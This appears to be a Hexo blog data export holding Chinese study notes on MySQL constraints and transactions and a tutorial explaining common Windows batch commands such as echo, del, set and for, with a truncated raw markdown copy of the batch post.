较低</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"日期型\"><a href=\"#日期型\" class=\"headerlink\" title=\"日期型\"></a>日期型</h4><ol>\n<li><p>分类：date 只保存日期</p>\n<p>​            time 只保存时间</p>\n<p>​            year 只保存年</p>\n<p>​            datetime 保存日期+时间</p>\n<p>​            timestamp 保存日期+时间</p>\n</li>\n<li><p>特点：</p>\n</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\t\t\t字节   范围          时区等的影响</span><br><span class=\"line\">datetime     8    1000-9999         不受</span><br><span class=\"line\">timestamp    4    1970-2038          受</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"常见约束\"><a href=\"#常见约束\" class=\"headerlink\" title=\"常见约束\"></a>常见约束</h3><ol>\n<li><p>含义：一种限制，用于限制表中的数据，为了保证表中数据的准确性和可靠性</p>\n</li>\n<li><p>分类：</p>\n</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. not null: 非空用于保证该字段值不能为空</span><br><span class=\"line\">2. default： 默认，用于赋予该字段默认值</span><br><span class=\"line\">3. primary key: 主键，用于保证该字段的值具有唯一性，并且非空</span><br><span class=\"line\">4. unique：用于保证该字段的值的唯一性</span><br><span class=\"line\">5. check：检查约束【MySQL中不支持】 </span><br><span class=\"line\">6. foreing key:外键约束，用于限制俩个表的关系，用于保证该字段的值必须来自于主表的关联列的值，在从表添加外键约束，用于引用主表中某列的值</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>添加约束的时机：</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. 创建表时</span><br><span class=\"line\">2. 修改表时</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>约束的添加分类：</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. 列级约束：</span><br><span class=\"line\">\t直接在字段名和类型后面追加约束类型即可</span><br><span class=\"line\">\t六大约束语法上都支持，但外键约束没有效果</span><br><span class=\"line\">2. 表级约束：</span><br><span class=\"line\">\t在所有字段的最下面：constraint 约束名 约束类型（字段名）</span><br><span class=\"line\">\t除了非空、默认约束，其他都支持</span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>主键与唯一：</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\t\t保证唯一性   是否允许为空   一个表中可以有多少个    是否允许组合</span><br><span class=\"line\">主键\t\tY\t\t\t\tN\t\t\t一个\t\t\t\t允许，不推荐</span><br><span class=\"line\">唯一\t\tY\t\t\t\tY\t\t\t多个 \t\t\t\t允许，不推荐</span><br></pre></td></tr></table></figure>\n\n<ol start=\"6\">\n<li>外键约束</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. 要求在从表中设置外键关系</span><br><span class=\"line\">2. 从表的外键列的类型和主表的关联列的类型要求一致或兼容，名称无要求</span><br><span class=\"line\">3. 主表的关联列必须是一个key（一般是主键或唯一）</span><br><span class=\"line\">4. 插入数据时，先插入主表，再插入从表，删除时相反</span><br><span class=\"line\"># 添加外键约束：</span><br><span class=\"line\">alter table stuinfo add constraint 表名字 foreing key(majorid) references major(id);</span><br></pre></td></tr></table></figure>\n\n<ol start=\"7\">\n<li>修改表时添加约束：</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. 添加列级约束：</span><br><span class=\"line\">alter table 表名 modify column 字段名 字段类型 新约束</span><br><span class=\"line\">2. 添加表级约束：</span><br><span class=\"line\">alter table 表名 add [constraint 约束名] 约束类型（字段名） 【外键的引用】</span><br></pre></td></tr></table></figure>\n\n<ol start=\"8\">\n<li>修改表时删除约束：</li>\n</ol>\n<p><img src=\"https://s1.ax1x.com/2020/06/25/NBXJgK.png\" alt=\"NBXJgK.png\"></p>\n<h3 id=\"标识列\"><a href=\"#标识列\" class=\"headerlink\" title=\"标识列\"></a>标识列</h3><ol>\n<li>又称为自增长列，可以不用手动的插入值，系统提供默认的序列值</li>\n<li>特点：</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. 标识列不一定要和主键搭配，但必须要和一个key搭配</span><br><span class=\"line\">2. 一个表至多只有一个标识列</span><br><span class=\"line\">3. 标识列的类型只能是数值型</span><br><span class=\"line\">4.标识列可以通过 set auto_increment_incremennt= ;设置步长</span><br><span class=\"line\">\t可以通过手动插入值，设置起始值</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>修改表时设置标识列</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">alter table 表名 modify column 字段值 类型 key名 auto_incerment;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>修改表时删除标识列</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">alter table 表名 modify column 字段值 类型；</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"TCL语言\"><a href=\"#TCL语言\" class=\"headerlink\" title=\"TCL语言\"></a>TCL语言</h2><ol>\n<li><p>事务控制语言，一个或一组sql语句组成一个执行单元，这个执行单元要么全部执行，要么全部不执行，比如转账的过程</p>\n</li>\n<li><p>事务的特性</p>\n</li>\n</ol>\n<p><img src=\"https://s1.ax1x.com/2020/06/25/NBXYjO.png\" alt=\"NBXYjO.png\"></p>\n<ol start=\"3\">\n<li>事务的创建</li>\n</ol>\n<p><img src=\"https://s1.ax1x.com/2020/06/25/NBX89x.png\" alt=\"NBX89x.png\"></p>\n<p><img src=\"https://s1.ax1x.com/2020/06/25/NBXNuD.png\" alt=\"NBXNuD.png\"></p>\n<ul>\n<li>实例</li>\n</ul>\n<p><img src=\"https://s1.ax1x.com/2020/06/25/NBXG36.png\" alt=\"NBXG36.png\"></p>\n<ol start=\"5\">\n<li>事务隔离级别</li>\n</ol>\n<p><a href=\"https://imgtu.com/i/NBjXy8\"><img src=\"https://s1.ax1x.com/2020/06/25/NBjXy8.md.png\" alt=\"NBjXy8.md.png\"></a></p>\n<p><a href=\"https://imgtu.com/i/NBjOQf\"><img src=\"https://s1.ax1x.com/2020/06/25/NBjOQf.md.png\" alt=\"NBjOQf.md.png\"></a></p>\n<ul>\n<li>MySQL中默认隔离级别 repeatable read</li>\n<li>oracle中默认级别 read committed</li>\n<li>查看隔离级别 ：select @@tx_isolation;</li>\n<li>设置隔离级别 ：</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set session 或 global transaction isolation level 隔离级别；</span><br></pre></td></tr></table></figure>\n\n\n\n<ol start=\"6\">\n<li>savepoint 节点名，设置保存点</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 演示savepoint的使用</span><br><span class=\"line\">set autocommit = 0;</span><br><span class=\"line\">start transaction;</span><br><span class=\"line\">delete from account where id=25;</span><br><span class=\"line\">savepoint a;  #设置保存点</span><br><span class=\"line\">delete from account where id=28;</span><br><span class=\"line\">rollback to a;  #回滚到保存点</span><br><span class=\"line\"></span><br><span class=\"line\">select * from account;</span><br><span class=\"line\"></span><br><span class=\"line\">结果：id=28还在，id=25没有</span><br></pre></td></tr></table></figure>"},{"title":"bat批处理","date":"2020-09-14T06:06:00.000Z","swiper":false,"swiperImg":"/medias/1.jpg","img":"http://cdn.mxrblog.cn/ct_1.jpg","top":false,"_content":"\n# bat批处理命令及解释\n\n[相关原文链接](https://www.cnblogs.com/xpwi/p/9626959.html)\n\n## 一、批处理概念\n\n- 批处理文件：包含DOS命令的可编辑可执行文件\n- 批处理：可以对某一对象批量操作的文件\n\n<!--more-->\n\n## 二、批处理命令简介\n\n### 命令1~10\n\n```\n1 echo 和 @\n回显命令\n@  #关闭单行回显\necho off  #从下一行开始关闭回显\n@echo off  #从本行开始关闭回显。一般批处理第一行都是这个\necho on #从下一行开始打开回显\necho #显示当前是 echo off 状态还是 echo on 状态\necho. #输出一个”回车换行”，空白行\n#(同echo, echo; echo+ echo[ echo] echo/ echo)\n\n2 errorlevel\necho %errorlevel%\n每个命令运行结束，可以用这个命令行格式查看返回码\n默认值为0，一般命令执行出错会设 errorlevel 为1\n\n3 dir\n显示文件夹内容\ndir #显示当前目录中的文件和子目录\ndir /a #显示当前目录中的文件和子目录，包括隐藏文件和系统文件\ndir c: /a:d #显示 C 盘当前目录中的目录\ndir c: /a:-d #显示 C 盘根目录中的文件\ndir c: /b/p #/b只显示文件名，/p分页显示\ndir *.exe /s #显示当前目录和子目录里所有的.exe文件\n\n4 cd\n切换目录\ncd #进入根目录\ncd #显示当前目录\ncd /d d:sdk #可以同时更改盘符和目录\n\n5 md\n创建目录\nmd d:abc #如果 d:a 不存在，将会自动创建中级目录\n#如果命令扩展名被停用，则需要键入 mkdir abc\n\n6 rd\n删除目录\nrd abc #删除当前目录里的 abc 子目录，要求为空目录\nrd /s/q d:temp #删除 d:temp 文件夹及其子文件夹和文件，/q安静模式\n\n7 del\n删除文件\ndel d:test.txt #删除指定文件，不能是隐藏、系统、只读文件\ndel /q/a/f d:temp*.*\n删除 d:temp 文件夹里面的所有文件，包括隐藏、只读、系统文件，不包括子目录\ndel /q/a/f/s d:temp*.*\n删除 d:temp 及子文件夹里面的所有文件，包括隐藏、只读、系统文件，不包括子目录\n\n8 ren\n重命名命令\nren d:temp tmp #支持对文件夹的重命名\n\n9 cls\n清屏\n10 type\n显示文件内容\ntype c:boot.ini #显示指定文件的内容，程序文件一般会显示乱码\ntype *.txt #显示当前目录里所有.txt文件的内容\n\n\n```\n\n### 命令11~20\n\n```\n11 copy\n拷贝文件\ncopy c:test.txt d:test.bak\n复制 c:test.txt 文件到 d: ，并重命名为 test.bak\ncopy con test.txt\n从屏幕上等待输入，按 Ctrl+Z 结束输入，输入内容存为test.txt文件\ncon代表屏幕，prn代表打印机，nul代表空设备\ncopy 1.txt + 2.txt 3.txt\n合并 1.txt 和 2.txt 的内容，保存为 3.txt 文件\n如果不指定 3.txt ，则保存到 1.txt\ncopy test.txt +\n复制文件到自己，实际上是修改了文件日期\n\n12 title\n设置cmd窗口的标题\ntitle 新标题 #可以看到cmd窗口的标题栏变了\n\n13 ver\n显示系统版本\n\n14 label 和 vol\n设置卷标\nvol #显示卷标\nlabel #显示卷标，同时提示输入新卷标\nlabel c:system #设置C盘的卷标为 system\n\n15 pause\n暂停命令 //常用于使命令行窗口暂停，不至于打开bat文件后立即结束\n\n16 rem 和 ::\n注释命令\n注释行不执行操作\n\n17 date 和 time\n日期和时间\ndate #显示当前日期，并提示输入新日期，按\"回车\"略过输入\ndate/t #只显示当前日期，不提示输入新日期\ntime #显示当前时间，并提示输入新时间，按\"回车\"略过输入\ntime/t #只显示当前时间，不提示输入新时间\n\n18 goto 和 :\n跳转命令\n:label #行首为:表示该行是标签行，标签行不执行操作\ngoto label #跳转到指定的标签那一行\n\n19 find (外部命令)\n查找命令\nfind \"abc\" c:test.txt\n在 c:test.txt 文件里查找含 abc 字符串的行\n如果找不到，将设 errorlevel 返回码为1\nfind /i “abc” c:test.txt\n查找含 abc 的行，忽略大小写\nfind /c \"abc\" c:test.txt\n显示含 abc 的行的行数\n\n20 more (外部命令)\n逐屏显示\nmore c:test.txt #逐屏显示 c:test.txt 的文件内容\n```\n\n\n\n### 命令21~30\n\n```\n21 tree\n显示目录结构\ntree d: #显示D盘的文件目录结构\n\n22 &\n顺序执行多条命令，而不管命令是否执行成功\n\n23 &&\n顺序执行多条命令，当碰到执行出错的命令后将不执行后面的命令\nfind \"ok\" c:test.txt && echo 成功\n如果找到了\"ok\"字样，就显示\"成功\"，找不到就不显示\n\n24 ||\n顺序执行多条命令，当碰到执行正确的命令后将不执行后面的命令\nfind \"ok\" c:test.txt || echo 不成功\n如果找不到\"ok\"字样，就显示\"不成功\"，找到了就不显示\n\n25 |\n管道命令\ndir *.* /s/a | find /c \".exe\"\n管道命令表示先执行 dir 命令，对其输出的结果执行后面的 find 命令\n该命令行结果：输出当前文件夹及所有子文件夹里的.exe文件的个数\ntype c:test.txt|more\n这个和 more c:test.txt 的效果是一样的\n\n26 > 和 >>\n输出重定向命令\n> 清除文件中原有的内容后再写入\n>> 追加内容到文件末尾，而不会清除原有的内容\n主要将本来显示在屏幕上的内容输出到指定文件中\n指定文件如果不存在，则自动生成该文件\ntype c:test.txt >prn\n屏幕上不显示文件内容，转向输出到打印机\necho hello world>con\n在屏幕上显示hello world，实际上所有输出都是默认 >con 的\ncopy c:test.txt f: >nul\n拷贝文件，并且不显示\"文件复制成功\"的提示信息，但如果f盘不存在，还是会显示出错信息\ncopy c:test.txt f: >nul 2>nul\n不显示”文件复制成功”的提示信息，并且f盘不存在的话，也不显示错误提示信息\necho ^^W ^> ^W>c:test.txt\n生成的文件内容为 ^W > W\n^ 和 > 是控制命令，要把它们输出到文件，必须在前面加个 ^ 符号\n\n27 <\n从文件中获得输入信息，而不是从屏幕上\n一般用于 date time label 等需要等待输入的命令\n@echo off\necho 2005-05-01>temp.txt\ndate <temp.txt\ndel temp.txt\n这样就可以不等待输入直接修改当前日期\n\n28 %0 %1 %2 %3 %4 %5 %6 %7 %8 %9 %*\n命令行传递给批处理的参数  //上一个命令的结果作为参数\n%0 批处理文件本身\n%1 第一个参数\n%9 第九个参数\n%* 从第一个参数开始的所有参数\n批参数(%n)的替代已被增强。您可以使用以下语法:\n%~1 - 删除引号(\" )， 扩充 %1\n%~f1 - 将 %1 扩充到一个完全合格的路径名\n%~d1 - 仅将 %1 扩充到一个驱动器号\n%~p1 - 仅将 %1 扩充到一个路径\n%~n1 - 仅将 %1 扩充到一个文件名\n%~x1 - 仅将 %1 扩充到一个文件扩展名\n%~s1 - 扩充的路径指含有短名\n%~a1 - 将 %1 扩充到文件属性\n%~t1 - 将 %1 扩充到文件的日期/时间\n%~z1 - 将 %1 扩充到文件的大小\n%~$PATH : 1 - 查找列在 PATH 环境变量的目录，并将 %1\n扩充到找到的第一个完全合格的名称。如果环境\n变量名未被定义，或者没有找到文件，此组合键会\n扩充到空字符串\n可以组合修定符来取得多重结果:\n%~dp1 - 只将 %1 扩展到驱动器号和路径\n%~nx1 - 只将 %1 扩展到文件名和扩展名\n%~dp$PATH:1 - 在列在 PATH 环境变量中的目录里查找 %1，\n并扩展到找到的第一个文件的驱动器号和路径。\n%~ftza1 - 将 %1 扩展到类似 DIR 的输出行。\n可以参照 call/? 或 for/? 看出每个参数的含意\necho load \"%%1\" \"%%2\">c:test.txt\n生成的文件内容为 load \"%1\"  \"%2\"\n批处理文件里，用这个格式把命令行参数输出到文件\n\n29 if\n判断命令\nif \"%1\"==\"/a\" echo 第一个参数是/a\nif /i \"%1\" equ \"/a\" echo 第一个参数是/a\n/i 表示不区分大小写，equ 和 == 是一样的，其它运算符参见 if/?\nif exist c:test.bat echo 存在c:test.bat文件\nif not exist c:windows (\necho 不存在c:windows文件夹\n)\nif exist c:test.bat (\necho 存在c:test.bat\n) else (\necho 不存在c:test.bat\n)\n30 setlocal 和 endlocal\n设置”命令扩展名”和”延缓环境变量扩充”\nSETLOCAL ENABLEEXTENSIONS #启用\"命令扩展名\"\nSETLOCAL DISABLEEXTENSIONS #停用\"命令扩展名\"\nSETLOCAL ENABLEDELAYEDEXPANSION #启用\"延缓环境变量扩充\"\nSETLOCAL DISABLEDELAYEDEXPANSION #停用\"延缓环境变量扩充\"\nENDLOCAL #恢复到使用SETLOCAL语句以前的状态\n“命令扩展名”默认为启用\n“延缓环境变量扩充”默认为停用\n批处理结束系统会自动恢复默认值\n可以修改注册表以禁用\"命令扩展名\"，详见 cmd /? 。所以用到\"命令扩展名\"的程\n序，建议在开头和结尾加上 SETLOCAL ENABLEEXTENSIONS 和 ENDLOCAL 语句，以确\n保程序能在其它系统上正确运行\n\"延缓环境变量扩充\"主要用于 if 和 for 的符合语句，在 set 的说明里有其实用例程\n```\n\n### 命令31~39\n\n```\n31 set\n设置变量\n引用变量可在变量名前后加 % ，即 %变量名%\nset #显示目前所有可用的变量，包括系统变量和自定义的变量\necho %SystemDrive% #显示系统盘盘符。系统变量可以直接引用\nset p #显示所有以p开头的变量，要是一个也没有就设errorlevel=1\nset p=aa1bb1aa2bb2 #设置变量p，并赋值为 = 后面的字符串，即aa1bb1aa2bb2\necho %p% #显示变量p代表的字符串，即aa1bb1aa2bb2\necho %p:~6% #显示变量p中第6个字符以后的所有字符，即aa2bb2\necho %p:~6,3% #显示第6个字符以后的3个字符，即aa2\necho %p:~0,3% #显示前3个字符，即aa1\necho %p:~-2% #显示最后面的2个字符，即b2\necho %p:~0,-2% #显示除了最后2个字符以外的其它字符，即aa1bb1aa2b\necho %p:aa=c% #用c替换变量p中所有的aa，即显示c1bb1c2bb2\necho %p:aa=% #将变量p中的所有aa字符串置换为空，即显示1bb12bb2\necho %p:*bb=c% #第一个bb及其之前的所有字符被替换为c，即显示c1aa2bb2\nset p=%p:*bb=c% #设置变量p，赋值为 %p:*bb=c% ，即c1aa2bb2\nset /a p=39 #设置p为数值型变量，值为39\nset /a p=39/10 #支持运算符，有小数时用去尾法，39/10=3.9，去尾得3，p=3\nset /a p=p/10 #用 /a 参数时，在 = 后面的变量可以不加%直接引用\nset /a p=”1&0″ #”与”运算，要加引号。其它支持的运算符参见set/?\nset p= #取消p变量\nset /p p=请输入\n屏幕上显示”请输入”，并会将输入的字符串赋值给变量p\n注意这条可以用来取代 choice 命令\n注意变量在 if 和 for 的复合语句里是一次性全部替换的，如\n@echo off\nset p=aaa\nif %p%==aaa (\necho %p%\nset p=bbb\necho %p%\n)\n结果将显示\naaa\naaa\n因为在读取 if 语句时已经将所有 %p% 替换为aaa\n这里的\"替换\"，在 /? 帮助里就是指\"扩充\"、\"环境变量扩充\"\n可以启用”延缓环境变量扩充”，用 ! 来引用变量，即 !变量名!\n@echo off\nSETLOCAL ENABLEDELAYEDEXPANSION\nset p=aaa\nif %p%==aaa (\necho %p%\nset p=bbb\necho !p!\n)\nENDLOCAL\n结果将显示\naaa\nbbb\n还有几个动态变量，运行 set 看不到\n%CD% #代表当前目录的字符串\n%DATE% #当前日期\n%TIME% #当前时间\n%RANDOM% #随机整数，介于0~32767\n%ERRORLEVEL% #当前 ERRORLEVEL 值\n%CMDEXTVERSION% #当前命令处理器扩展名版本号\n%CMDCMDLINE% #调用命令处理器的原始命令行\n可以用echo命令查看每个变量值，如 echo %time%\n注意 %time% 精确到毫秒，在批处理需要延时处理时可以用到\n\n32 start\n批处理中调用外部程序的命令，否则等外部程序完成后才继续执行剩下的指令\n\n33 call\n批处理中调用另外一个批处理的命令，否则剩下的批处理指令将不会被执行\n有时有的应用程序用start调用出错的，也可以call调用\n\n34 choice (外部命令)\n选择命令\n让用户输入一个字符，从而选择运行不同的命令，返回码errorlevel为1234……\nwin98里是choice.com\nwin2000pro里没有，可以从win98里拷过来\nwin2003里是choice.exe\nchoice /N /C y /T 5 /D y>nul\n延时5秒\n\n35 assoc 和 ftype\n文件关联\nassoc 设置'文件扩展名'关联，关联到'文件类型'\nftype 设置'文件类型'关联，关联到'执行程序和参数'\n当你双击一个.txt文件时，windows并不是根据.txt直接判断用 notepad.exe 打开\n而是先判断.txt属于 txtfile '文件类型'\n再调用 txtfile 关联的命令行 txtfile=%SystemRoot%system32NOTEPAD.EXE %1\n可以在\"文件夹选项\"→\"文件类型\"里修改这2种关联\nassoc #显示所有'文件扩展名'关联\nassoc .txt #显示.txt代表的'文件类型'，结果显示 .txt=txtfile\nassoc .doc #显示.doc代表的'文件类型'，结果显示 .doc=Word.Document.8\nassoc .exe #显示.exe代表的'文件类型'，结果显示 .exe=exefile\nftype #显示所有'文件类型'关联\nftype exefile #显示exefile类型关联的命令行，结果显示 exefile=\"%1\" %*\nassoc .txt=Word.Document.8\n设置.txt为word类型的文档，可以看到.txt文件的图标都变了\nassoc .txt=txtfile\n恢复.txt的正确关联\nftype exefile=\"%1\" %*\n恢复 exefile 的正确关联\n如果该关联已经被破坏，可以运行 command.com ，再输入这条命令\n\n36 pushd 和 popd\n切换当前目录\n@echo off\nc: & cd & md mp3 #在 C: 建立 mp3 文件夹\nmd d:mp4 #在 D: 建立 mp4 文件夹\ncd /d d:mp4 #更改当前目录为 d:mp4\npushd c:mp3 #保存当前目录，并切换当前目录为 c:mp3\npopd #恢复当前目录为刚才保存的 d:mp4\n\n37 for\n循环命令\n这个比较复杂，请对照 for/? 来看\nfor %%i in (c: d: e: f:) do echo %%i\n依次调用小括号里的每个字符串，执行 do 后面的命令\n注意%%i，在批处理中 for 语句调用参数用2个%\n默认的字符串分隔符是\"空格键\"，\"Tab键\"，\"回车键\"\nfor %%i in (*.txt) do find \"abc\" %%i\n对当前目录里所有的txt文件执行 find 命令\nfor /r . %%i in (*.txt) do find \"abc\" %%i\n在当前目录和子目录里所有的.txt文件中搜索包含 abc 字符串的行\nfor /r . %%i in (.) do echo %%~pni\n显示当前目录名和所有子目录名，包括路径，不包括盘符\nfor /r d:mp3 %%i in (*.mp3) do echo %%i>>d:mp3.txt\n把 d:mp3 及其子目录里的mp3文件的文件名都存到 d:mp3.txt 里去\nfor /l %%i in (2,1,8) do echo %%i\n生成2345678的一串数字，2是数字序列的开头，8是结尾，1表示每次加1\nfor /f %%i in ('set') do echo %%i\n对 set 命令的输出结果循环调用，每行一个\nfor /f \"eol=P\" %%i in ('set') do echo %%i\n取 set 命令的输出结果，忽略以 P 开头的那几行\nfor /f %%i in (d:mp3.txt) do echo %%i\n显示 d:mp3.txt 里的每个文件名，每行一个，不支持带空格的名称\nfor /f \"delims=\" %%i in (d:mp3.txt) do echo %%i\n显示 d:mp3.txt 里的每个文件名，每行一个，支持带空格的名称\nfor /f \"skip=5 tokens=4\" %%a in ('dir') do echo %%a\n对 dir 命令的结果，跳过前面5行，余下的每行取第4列\n每列之间的分隔符为默认的\"空格\"\n可以注意到 dir 命令输出的前5行是没有文件名的\nfor /f \"tokens=1,2,3 delims=- \" %%a in ('date /t') do (\necho %%a\necho %%b\necho %%c\n)\n对 date /t 的输出结果，每行取1、2、3列\n第一列对应指定的 %%a ，后面的 %%b 和 %%c 是派生出来的，对应其它列\n分隔符指定为 - 和\"空格\"，注意 delims=- 后面有个\"空格\"\n其中 tokens=1,2,3 若用 tokens=1-3 替换，效果是一样的\nfor /f \"tokens=2* delims=- \" %%a in ('date /t') do echo %%b\n取第2列给 %%a ，其后的列都给 %%b\n\n38 subst (外部命令)\n映射磁盘。\nsubst z: serverd #这样输入z:就可以访问serverd了\nsubst z: /d #取消该映射\nsubst #显示目前所有的映时\n\n39 xcopy (外部命令)\n文件拷贝\nxcopy d:mp3 e:mp3 /s/e/i/y\n复制 d:mp3 文件夹、所有子文件夹和文件到 e: ，覆盖已有文件\n加 /i 表示如果 e: 没有 mp3 文件夹就自动新建一个，否则会有询问\n```\n\n","source":"_posts/bat批处理文件.md","raw":"---\ntitle: bat批处理\ndate: 2020-09-14 14:06\nswiper: false # 将改文章放入轮播图中\nswiperImg: '/medias/1.jpg' # 该文章在轮播图中的图片，可以是本地目录下图片也可以是http://xxx图片\nimg: 'http://cdn.mxrblog.cn/ct_1.jpg' # 该文章图片，可以是本地目录下图片也可以是http://xxx图片\ncategories: win10\ntags: [win10, bat]\ntop: false\n---\n\n# bat批处理命令及解释\n\n[相关原文链接](https://www.cnblogs.com/xpwi/p/9626959.html)\n\n## 一、批处理概念\n\n- 批处理文件：包含DOS命令的可编辑可执行文件\n- 批处理：可以对某一对象批量操作的文件\n\n<!--more-->\n\n## 二、批处理命令简介\n\n### 命令1~10\n\n```\n1 echo 和 @\n回显命令\n@  #关闭单行回显\necho off  #从下一行开始关闭回显\n@echo off  #从本行开始关闭回显。一般批处理第一行都是这个\necho on #从下一行开始打开回显\necho #显示当前是 echo off 状态还是 echo on 状态\necho. #输出一个”回车换行”，空白行\n#(同echo, echo; echo+ echo[ echo] echo/ echo)\n\n2 errorlevel\necho %errorlevel%\n每个命令运行结束，可以用这个命令行格式查看返回码\n默认值为0，一般命令执行出错会设 errorlevel 为1\n\n3 dir\n显示文件夹内容\ndir #显示当前目录中的文件和子目录\ndir /a #显示当前目录中的文件和子目录，包括隐藏文件和系统文件\ndir c: /a:d #显示 C 盘当前目录中的目录\ndir c: /a:-d #显示 C 盘根目录中的文件\ndir c: /b/p #/b只显示文件名，/p分页显示\ndir *.exe /s #显示当前目录和子目录里所有的.exe文件\n\n4 cd\n切换目录\ncd #进入根目录\ncd #显示当前目录\ncd /d d:sdk #可以同时更改盘符和目录\n\n5 md\n创建目录\nmd d:abc #如果 d:a 不存在，将会自动创建中级目录\n#如果命令扩展名被停用，则需要键入 mkdir abc\n\n6 rd\n删除目录\nrd abc #删除当前目录里的 abc 子目录，要求为空目录\nrd /s/q d:temp #删除 d:temp 文件夹及其子文件夹和文件，/q安静模式\n\n7 del\n删除文件\ndel d:test.txt #删除指定文件，不能是隐藏、系统、只读文件\ndel /q/a/f d:temp*.*\n删除 d:temp 文件夹里面的所有文件，包括隐藏、只读、系统文件，不包括子目录\ndel /q/a/f/s d:temp*.*\n删除 d:temp 及子文件夹里面的所有文件，包括隐藏、只读、系统文件，不包括子目录\n\n8 ren\n重命名命令\nren d:temp tmp #支持对文件夹的重命名\n\n9 cls\n清屏\n10 type\n显示文件内容\ntype c:boot.ini #显示指定文件的内容，程序文件一般会显示乱码\ntype *.txt #显示当前目录里所有.txt文件的内容\n\n\n```\n\n### 命令11~20\n\n```\n11 copy\n拷贝文件\ncopy c:test.txt d:test.bak\n复制 c:test.txt 文件到 d: ，并重命名为 test.bak\ncopy con test.txt\n从屏幕上等待输入，按 Ctrl+Z 结束输入，输入内容存为test.txt文件\ncon代表屏幕，prn代表打印机，nul代表空设备\ncopy 1.txt + 2.txt 3.txt\n合并 1.txt 和 2.txt 的内容，保存为 3.txt 文件\n如果不指定 3.txt ，则保存到 1.txt\ncopy test.txt +\n复制文件到自己，实际上是修改了文件日期\n\n12 title\n设置cmd窗口的标题\ntitle 新标题 #可以看到cmd窗口的标题栏变了\n\n13 ver\n显示系统版本\n\n14 label 和 vol\n设置卷标\nvol #显示卷标\nlabel #显示卷标，同时提示输入新卷标\nlabel c:system #设置C盘的卷标为 system\n\n15 pause\n暂停命令 //常用于使命令行窗口暂停，不至于打开bat文件后立即结束\n\n16 rem 和 ::\n注释命令\n注释行不执行操作\n\n17 date 和 time\n日期和时间\ndate #显示当前日期，并提示输入新日期，按\"回车\"略过输入\ndate/t #只显示当前日期，不提示输入新日期\ntime #显示当前时间，并提示输入新时间，按\"回车\"略过输入\ntime/t #只显示当前时间，不提示输入新时间\n\n18 goto 和 :\n跳转命令\n:label #行首为:表示该行是标签行，标签行不执行操作\ngoto label #跳转到指定的标签那一行\n\n19 find (外部命令)\n查找命令\nfind \"abc\" c:test.txt\n在 c:test.txt 文件里查找含 abc 字符串的行\n如果找不到，将设 errorlevel 返回码为1\nfind /i “abc” c:test.txt\n查找含 abc 的行，忽略大小写\nfind /c \"abc\" c:test.txt\n显示含 abc 的行的行数\n\n20 more (外部命令)\n逐屏显示\nmore c:test.txt #逐屏显示 c:test.txt 的文件内容\n```\n\n\n\n### 命令21~30\n\n```\n21 tree\n显示目录结构\ntree d: #显示D盘的文件目录结构\n\n22 &\n顺序执行多条命令，而不管命令是否执行成功\n\n23 &&\n顺序执行多条命令，当碰到执行出错的命令后将不执行后面的命令\nfind \"ok\" c:test.txt && echo 成功\n如果找到了\"ok\"字样，就显示\"成功\"，找不到就不显示\n\n24 ||\n顺序执行多条命令，当碰到执行正确的命令后将不执行后面的命令\nfind \"ok\" c:test.txt || echo 不成功\n如果找不到\"ok\"字样，就显示\"不成功\"，找到了就不显示\n\n25 